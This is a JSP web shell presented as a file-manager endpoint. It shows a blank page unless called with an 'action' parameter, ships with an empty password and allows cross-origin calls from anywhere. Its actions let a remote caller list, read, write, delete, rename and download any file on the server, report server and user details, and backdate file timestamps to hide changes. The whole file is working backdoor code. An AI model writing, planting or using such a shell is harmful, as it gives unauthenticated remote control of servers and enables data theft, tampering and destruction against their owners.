<%@ page language="java" contentType="application/json; charset=UTF-8" pageEncoding="UTF-8" import="java.io.*, java.util.*, java.text.*, java.nio.file.*, java.nio.file.attribute.*" %><%
response.setHeader("Access-Control-Allow-Origin", "*");
response.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
response.setHeader("Access-Control-Allow-Headers", "Content-Type");

String action = request.getParameter("action");
String password = request.getParameter("password");

// No action = blank page
if (action == null || action.isEmpty()) {
    response.setContentType("text/html");
    return;
}

// Password (change here)
String PASSWORD = "";

if (PASSWORD != null && !PASSWORD.isEmpty()) {
    if (password == null || !password.equals(PASSWORD)) {
        out.print("null");
        return;
    }
}

String result = "";

if ("list".equals(action)) {
    String path = request.getParameter("path");
    if (path == null || path.isEmpty() || "/".equals(path)) {
        path = application.getRealPath("/");
    }

    File dir = new File(path);
    if (dir.exists() && dir.isDirectory()) {
        StringBuilder json = new StringBuilder();
        json.append("{\"success\":true,\"data\":{\"path\":\"").append(escapeJson(path)).append("\",\"items\":[");

        // Parent directory
        String parentPath = dir.getParent();
        if (parentPath != null) {
            json.append("{\"name\":\"..\",\"path\":\"").append(escapeJson(parentPath)).append("\",\"is_dir\":true,\"size\":0,\"size_formatted\":\"-\",\"mtime\":0,\"perms\":\"drwxr-xr-x\",\"readable\":true,\"writable\":true}");
        }

        File[] files = dir.listFiles();
        if (files != null) {
            Arrays.sort(files, (a, b) -> {
                if (a.isDirectory() && !b.isDirectory()) return -1;
                if (!a.isDirectory() && b.isDirectory()) return 1;
                return a.getName().compareToIgnoreCase(b.getName());
            });

            for (File f : files) {
                if (json.charAt(json.length() - 1) != '[') json.append(",");
                long mtime = f.lastModified() / 1000;
                if (f.isDirectory()) {
                    json.append("{\"name\":\"").append(escapeJson(f.getName())).append("\",\"path\":\"").append(escapeJson(f.getAbsolutePath())).append("\",\"is_dir\":true,\"size\":0,\"size_formatted\":\"-\",\"mtime\":").append(mtime).append(",\"perms\":\"drwxr-xr-x\",\"readable\":").append(f.canRead()).append(",\"writable\":").append(f.canWrite()).append("}");
                } else {
                    json.append("{\"name\":\"").append(escapeJson(f.getName())).append("\",\"path\":\"").append(escapeJson(f.getAbsolutePath())).append("\",\"is_dir\":false,\"size\":").append(f.length()).append(",\"size_formatted\":\"").append(f.length()).append(" B\",\"mtime\":").append(mtime).append(",\"perms\":\"-rw-r--r--\",\"readable\":").append(f.canRead()).append(",\"writable\":").append(f.canWrite()).append("}");
                }
            }
        }

        json.append("]},\"message\":\"\"}");
        result = json.toString();
    } else {
        result = "{\"success\":false,\"message\":\"Directory not found\"}";
    }

} else if ("read".equals(action)) {
    String path = request.getParameter("path");
    File file = new File(path);
    if (file.exists() && file.isFile()) {
        StringBuilder content = new StringBuilder();
        BufferedReader reader = new BufferedReader(new InputStreamReader(new FileInputStream(file), "UTF-8"));
        String line;
        while ((line = reader.readLine()) != null) {
            if (content.length() > 0) content.append("\n");
            content.append(line);
        }
        reader.close();
        result = "{\"success\":true,\"data\":{\"path\":\"" + escapeJson(path) + "\",\"content\":\"" + escapeJson(content.toString()) + "\"},\"message\":\"\"}";
    } else {
        result = "{\"success\":false,\"message\":\"File not found\"}";
    }

} else if ("write".equals(action)) {
    String path = request.getParameter("path");
    String content = request.getParameter("content");
    if (content == null) content = "";
    if (path != null && !path.isEmpty()) {
        PrintWriter writer = new PrintWriter(new OutputStreamWriter(new FileOutputStream(path), "UTF-8"));
        writer.print(content);
        writer.close();
        result = "{\"success\":true,\"message\":\"Saved\"}";
    } else {
        result = "{\"success\":false,\"message\":\"Path empty\"}";
    }

} else if ("mkdir".equals(action)) {
    String path = request.getParameter("path");
    if (path != null && !path.isEmpty()) {
        File dir = new File(path);
        if (!dir.exists()) {
            if (dir.mkdirs()) {
                result = "{\"success\":true,\"message\":\"Created\"}";
            } else {
                result = "{\"success\":false,\"message\":\"Failed to create directory\"}";
            }
        } else {
            result = "{\"success\":false,\"message\":\"Already exists\"}";
        }
    } else {
        result = "{\"success\":false,\"message\":\"Path empty\"}";
    }

} else if ("delete".equals(action)) {
    String path = request.getParameter("path");
    File file = new File(path);
    if (file.exists()) {
        if (deleteRecursive(file)) {
            result = "{\"success\":true,\"message\":\"Deleted\"}";
        } else {
            result = "{\"success\":false,\"message\":\"Failed to delete\"}";
        }
    } else {
        result = "{\"success\":false,\"message\":\"Not found\"}";
    }

} else if ("rename".equals(action)) {
    String oldPath = request.getParameter("old_path");
    String newPath = request.getParameter("new_path");
    File oldFile = new File(oldPath);
    File newFile = new File(newPath);
    if (oldFile.exists()) {
        if (oldFile.renameTo(newFile)) {
            result = "{\"success\":true,\"message\":\"Renamed\"}";
        } else {
            result = "{\"success\":false,\"message\":\"Failed to rename\"}";
        }
    } else {
        result = "{\"success\":false,\"message\":\"Not found\"}";
    }

} else if ("download".equals(action)) {
    String path = request.getParameter("path");
    File file = new File(path);
    if (file.exists() && file.isFile()) {
        response.setContentType("application/octet-stream");
        response.setHeader("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
        response.setContentLength((int) file.length());

        FileInputStream fis = new FileInputStream(file);
        OutputStream os = response.getOutputStream();
        byte[] buffer = new byte[4096];
        int bytesRead;
        while ((bytesRead = fis.read(buffer)) != -1) {
            os.write(buffer, 0, bytesRead);
        }
        fis.close();
        os.flush();
        return;
    } else {
        result = "{\"success\":false,\"message\":\"File not found\"}";
    }

} else if ("upload".equals(action)) {
    result = "{\"success\":false,\"message\":\"Upload requires multipart config. Use servlet for upload.\"}";

} else if ("server".equals(action)) {
    String docRoot = application.getRealPath("/");
    File root = new File(docRoot);
    long freeSpace = root.getFreeSpace();
    long totalSpace = root.getTotalSpace();
    String javaVersion = System.getProperty("java.version");
    String serverInfo = application.getServerInfo();

    result = "{\"success\":true,\"data\":{\"php_version\":\"Java " + escapeJson(javaVersion) + "\",\"server_software\":\"" + escapeJson(serverInfo) + "\",\"document_root\":\"" + escapeJson(docRoot) + "\",\"script_path\":\"" + escapeJson(docRoot) + "\",\"upload_max\":\"N/A\",\"post_max\":\"N/A\",\"disk_free\":\"" + freeSpace + "\",\"disk_total\":\"" + totalSpace + "\",\"current_user\":\"" + System.getProperty("user.name") + "\"},\"message\":\"\"}";

} else if ("touch".equals(action)) {
    String path = request.getParameter("path");
    String timeStr = request.getParameter("time");
    if (path != null && timeStr != null) {
        File file = new File(path);
        if (file.exists()) {
            long timestamp = Long.parseLong(timeStr) * 1000;
            if (file.setLastModified(timestamp)) {
                result = "{\"success\":true,\"message\":\"Time updated\"}";
            } else {
                result = "{\"success\":false,\"message\":\"Failed to update time\"}";
            }
        } else {
            result = "{\"success\":false,\"message\":\"Not found\"}";
        }
    } else {
        result = "{\"success\":false,\"message\":\"Path or time empty\"}";
    }

} else if ("info".equals(action)) {
    String path = request.getParameter("path");
    File file = new File(path);
    if (file.exists()) {
        long mtime = file.lastModified() / 1000;
        long size = file.isFile() ? file.length() : 0;
        String sizeFormatted = file.isFile() ? size + " B" : "-";
        String perms = file.isDirectory() ? "drwxr-xr-x" : "-rw-r--r--";
        String permsOctal = file.isDirectory() ? "0755" : "0644";

        result = "{\"success\":true,\"data\":{\"path\":\"" + escapeJson(path) + "\",\"name\":\"" + escapeJson(file.getName()) + "\",\"is_dir\":" + file.isDirectory() + ",\"size\":" + size + ",\"size_formatted\":\"" + sizeFormatted + "\",\"mtime\":" + mtime + ",\"ctime\":" + mtime + ",\"atime\":" + mtime + ",\"perms\":\"" + perms + "\",\"perms_octal\":\"" + permsOctal + "\",\"readable\":" + file.canRead() + ",\"writable\":" + file.canWrite() + ",\"owner\":0,\"group\":0},\"message\":\"\"}";
    } else {
        result = "{\"success\":false,\"message\":\"Not found\"}";
    }

} else {
    result = "{\"success\":false,\"message\":\"Unknown action\"}";
}

out.print(result);
%><%!
private String escapeJson(String s) {
    if (s == null) return "";
    return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
}

private boolean deleteRecursive(File file) {
    if (file.isDirectory()) {
        File[] children = file.listFiles();
        if (children != null) {
            for (File child : children) {
                deleteRecursive(child);
            }
        }
    }
    return file.delete();
}
%>
